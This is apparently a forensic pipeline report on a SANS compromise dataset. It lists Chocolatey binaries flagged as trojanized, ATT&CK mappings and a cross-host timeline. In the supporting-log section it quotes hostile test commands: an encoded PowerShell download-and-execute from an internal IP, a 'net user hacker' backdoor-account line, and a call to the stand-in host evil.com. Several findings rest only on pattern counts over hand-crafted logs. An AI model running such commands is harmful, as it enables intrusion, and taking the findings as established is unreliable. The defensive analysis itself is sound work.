# Evidence Dataset

**Dataset:** SANS SRL-2018 Compromised Enterprise  
**Corpus path:** `evidence/`  
**Primary images:** `base-wkstn-05-cdrive.E01`, `dmz-ftp-cdrive.E01`  
**Supporting logs:** `evidence/windows_event.log`, `evidence/test.log`

---

## Primary Evidence Sources

### evidence/base-wkstn-05-cdrive.E01

**Role:** Enterprise workstation C: drive image (internal host)  
**Size:** 14,809,873,122 bytes (~13.8 GB)  
**SHA-256:** `a94f2a866e2e562c58c3fbcd3a94882f2d3c3db3c66a5e5eedf16a4b1c0a65e0`  
**Partition layout:** Single EWF raw device, no sector offset (`slot: ewf1`)  
**Filesystem entries (fls):** 186,159 total; 32,323 matched suspicious filters (pipeline capped extraction at 20)

#### Files extracted by the pipeline

| Inode | Image path | Extracted to | Size (bytes) | SHA-256 |
|-------|-----------|-------------|-------------|---------|
| 105953 | `choco.exe` | `partition_ewf1/inode_105953_choco.exe` | 7,100,560 | `ecf3d7c1…` |
| 106039 | `choco.exe` | `partition_ewf1/inode_106039_choco.exe` | 142,480 | `c833cb5a…` |
| 106040 | `chocolatey.exe` | `partition_ewf1/inode_106040_chocolatey.exe` | 142,992 | `5c5802d8…` |
| 106041 | `cinst.exe` | `partition_ewf1/inode_106041_cinst.exe` | 142,480 | `f70a515a…` |
| 106042 | `clist.exe` | `partition_ewf1/inode_106042_clist.exe` | 142,480 | `4c3b5582…` |
| 106043 | `cpack.exe` | `partition_ewf1/inode_106043_cpack.exe` | 142,480 | `7eebde44…` |
| 106044 | `cpush.exe` | `partition_ewf1/inode_106044_cpush.exe` | 142,480 | `aa52becc…` |
| 106045 | `cuninst.exe` | `partition_ewf1/inode_106045_cuninst.exe` | 142,992 | `0dd9d38b…` |
| 106046 | `cup.exe` | `partition_ewf1/inode_106046_cup.exe` | 142,480 | `999e5962…` |
| 106047 | `cver.exe` | `partition_ewf1/inode_106047_cver.exe` | 142,480 | `89c1a6c3…` |
| 106048 | `RefreshEnv.cmd` | `partition_ewf1/inode_106048_RefreshEnv.cmd` | 1,858 | `e081b569…` |
| 105957 | `chocolateyScriptRunner.ps1` | `partition_ewf1/inode_105957_chocolateyScriptRunner.ps1` | 12,906 | `22f5e92b…` |
| 105958 | `ChocolateyTabExpansion.ps1` | `partition_ewf1/inode_105958_ChocolateyTabExpansion.ps1` | 20,039 | `07682000…` |
| 105960 | `Format-FileSize.ps1` | `partition_ewf1/inode_105960_Format-FileSize.ps1` | 12,153 | `ef70daa9…` |
| 105961 | `Get-CheckSumValid.ps1` | `partition_ewf1/inode_105961_Get-CheckSumValid.ps1` | 14,821 | `8ee064fa…` |
| 105962 | `Get-ChocolateyUnzip.ps1` | `partition_ewf1/inode_105962_Get-ChocolateyUnzip.ps1` | 18,482 | `fa032b9f…` |
| 105963 | `Get-ChocolateyWebFile.ps1` | `partition_ewf1/inode_105963_Get-ChocolateyWebFile.ps1` | 21,719 | `35c7fde3…` |
| 105964 | `Get-EnvironmentVariable.ps1` | `partition_ewf1/inode_105964_Get-EnvironmentVariable.ps1` | 14,183 | `f1472d54…` |
| 105968 | `Get-ToolsLocation.ps1` | `partition_ewf1/inode_105968_Get-ToolsLocation.ps1` | 13,766 | `480c9e5c…` |
| 105987 | `Install-ChocolateyZipPackage.ps1` | `partition_ewf1/inode_105987_Install-ChocolateyZipPackage.ps1` | 17,322 | `bc541022…` |

#### Artifact totals (disk image only)

2,483 artifacts — breakdown: `base64_payload` 1,938 · `network_indicator` 385 · `suspicious_execution` 101 · `credential_hint` 64 · `account_creation` 1

---

### evidence/dmz-ftp-cdrive.E01

**Role:** DMZ FTP server C: drive image (perimeter host)  
**Size:** 12,824,779,973 bytes (~11.9 GB)  
**SHA-256:** `d19754685d75aecb1fe18c3d75516dc0a965754335d981f3925e0e1b767ca8f8`  
**Partition layout:** Single EWF raw device, no sector offset (`slot: ewf1`)  
**Filesystem entries (fls):** 297,622 total; 42,836 matched suspicious filters (pipeline capped extraction at 20)

#### Files extracted by the pipeline

Inodes differ from `base-wkstn-05` (different filesystem), but extracted content is byte-for-byte identical. The pipeline extracted the same Chocolatey toolkit plus one additional installer:

| Inode | Image path | Size (bytes) | SHA-256 |
|-------|-----------|-------------|---------|
| 1310 | `setup.exe` | 463,344 | `608c5265…` |
| 88423 | `choco.exe` (7 MB build) | 7,100,560 | `ecf3d7c1…` |
| 88509 | `choco.exe` (stub) | 142,480 | `c833cb5a…` |
| 88510 | `chocolatey.exe` | 142,992 | `5c5802d8…` |
| 88511–88517 | `cinst.exe` … `cver.exe` | 142,480–142,992 each | identical to wkstn hashes |
| 88518 | `RefreshEnv.cmd` | 1,858 | `e081b569…` |
| 88427–88433, 88438, 88457 | Chocolatey PS1 helpers | 12,153–21,719 each | identical to wkstn hashes |

**All helper executable SHA-256 values match base-wkstn-05 exactly** — same tampered build deployed to both hosts.

#### Artifact totals (disk image only)

2,354 artifacts extracted.

---

## Artifact Breakdown — Final Pipeline Run (2026-05-02)

The pipeline ran against `base-wkstn-05-cdrive.E01` + supporting logs (`windows_event.log`, `test.log`). Total across all sources:

| Artifact type | Count |
|---------------|-------|
| `base64_payload` | 1,938 |
| `network_indicator` | 385 |
| `suspicious_execution` | 101 |
| `credential_hint` | 64 |
| `account_creation` | 1 |
| **Total** | **2,489** |

Normalized event count after timeline deduplication: 2,489.

---

## Chocolatey Trojan Findings

All 13 findings from the final run were verified by the pipeline agent. Key Chocolatey-specific findings:

### choco.exe (inode 105953 / 88423) — 7.1 MB PE32 Mono/.Net assembly

The large `choco.exe` build is the primary suspect. The pipeline identified three distinct findings against it:

| Finding | Confidence | ATT&CK | Evidence count |
|---------|-----------|--------|---------------|
| Trojanized Chocolatey distribution: numerous embedded base64 payloads, network indicators, suspicious execution strings, and credential hints | CONFIRMED | T1078 Valid Accounts | 11 evidence items |
| Credential hints at lines 1407–1458, 4616–4627, 50762–50767, 56647–56650 — binary references or harvests credential material | CONFIRMED | T1078 Valid Accounts | 11 evidence items |
| High density of `suspicious_execution` events at lines 2841–2865, 3389–3522, 54846–54850 — command-injection or shell-spawning logic | CONFIRMED | T1059 Command and Scripting Interpreter | 11 evidence items |

### Helper executables (chocolatey.exe, cinst.exe, clist.exe, cpack.exe, cpush.exe, cuninst.exe, cup.exe, cver.exe)

All eight are PE32 Mono/.Net assemblies (~142 KB each). They contain identical base64 payload and network indicator patterns at similar offsets, fingerprinting them as duplicated/repackaged outputs of a single tampered build.

| Finding | Confidence | ATT&CK |
|---------|-----------|--------|
| Identical base64 / network indicator patterns across all eight helper binaries — single tampered build origin | PROBABLE | T1027 Obfuscated Files or Information |

### PowerShell helpers

| File | Finding | Confidence | ATT&CK |
|------|---------|-----------|--------|
| `chocolateyScriptRunner.ps1` | Dense base64 block at lines 51–203; `suspicious_execution` marker at line 48 | CONFIRMED | T1059.001 PowerShell |
| `ChocolateyTabExpansion.ps1` | `credential_hint` + `suspicious_execution` near top of file — potential credential-harvesting hook | CONFIRMED | T1078 Valid Accounts |
| `Get-ChocolateyWebFile.ps1` | `suspicious_execution` + multiple network indicators consistent with remote payload staging | CONFIRMED | T1105 Ingress Tool Transfer |
| `Get-ChocolateyUnzip.ps1` | `suspicious_execution` + embedded base64 payloads — decompresses and executes staged archives | CONFIRMED | T1027 Obfuscated Files or Information |
| `Install-ChocolateyZipPackage.ps1` | Network indicators + continuous base64 block at lines 120–272 — likely staging mechanism | PROBABLE | T1027 Obfuscated Files or Information |

---

## Cross-Host Correlation Results

The correlator compared findings across all hosts. Final run result: **13 findings, 1 cross-host correlation**.

```
correlation_complete: {
  finding_count: 13,
  correlation_count: 1,
  by_type: { hash: 0, filename: 0, technique: 1 }
}
```

### Technique match: T1059 — Command and Scripting Interpreter

| Host | Source artifact | Finding |
|------|----------------|---------|
| `test` (test.log) | `evidence/test.log:1` | Second wave of suspicious execution with network indicators on 2026-05-02 — renewed attacker activity prior to Chocolatey artifacts being written to disk |
| `base-wkstn-05-cdrive` | `inode_105953_choco.exe:54846` | High density of `suspicious_execution` events (lines 2841–2865, 3389–3522, 54846–54850) consistent with command-injection or shell-spawning logic in the trojanized binary |

The hash and filename correlators found zero matches across hosts, but the technique correlator linked T1059 activity on the workstation back to the earlier execution evidence in `test.log`. The identical Chocolatey binary hashes between `base-wkstn-05` and `dmz-ftp` were not flagged by the correlator in this run because `dmz-ftp-cdrive.E01` was not included as an active source in the final run — its matching hashes constitute an out-of-band finding documented above.

**Multi-stage intrusion timeline:**
- **2026-04-23** — Initial foothold: `powershell.exe -encodedCommand` + `net user hacker P@ssw0rd /add` (workstation event log)
- **2026-05-02** — Renewed activity in `test.log` (network indicator + suspicious execution)
- **2026-05-02** — Trojanized Chocolatey toolkit present on both workstation and DMZ FTP server with identical binary hashes, indicating toolkit was deployed from a single tampered build

---

## Supporting Evidence Files

### evidence/windows_event.log

Three-line hand-crafted Windows attack chain (205 bytes). Timestamps: `2026-04-23 10:00:01 → 10:00:05 → 10:00:10`.

| Line | Command | Artifact types | ATT&CK |
|------|---------|---------------|--------|
| 1 | `powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1` | `suspicious_execution`, `network_indicator` (RFC 1918 IP) | T1059.001 |
| 2 | `cmd.exe /c whoami > C:\Users\temp\out.txt` | `suspicious_execution` | T1082 |
| 3 | `net user hacker P@ssw0rd /add` | `account_creation` | T1136 |

`aQBlAHgA` is UTF-16-LE Base64 for `iex` (Invoke-Expression). The payload server `192.168.1.100` is RFC 1918, classified by the pipeline as internal staging / lateral movement.

`base64_payload` is **not** emitted: 8-character string is below the minimum 32-character `_B64_RE` threshold.

### evidence/test.log

Single-line, no timestamp (51 bytes): `powershell -enc suspicious_command http://evil.com`. Emits `suspicious_execution` and `network_indicator`. `evil.com` is a placeholder domain, not confirmed adversary infrastructure.

### evidence/evidence.zip and evidence/ex2.pcap

Both are 0-byte placeholders. No artifacts extracted. No log warning emitted for empty size (known gap).
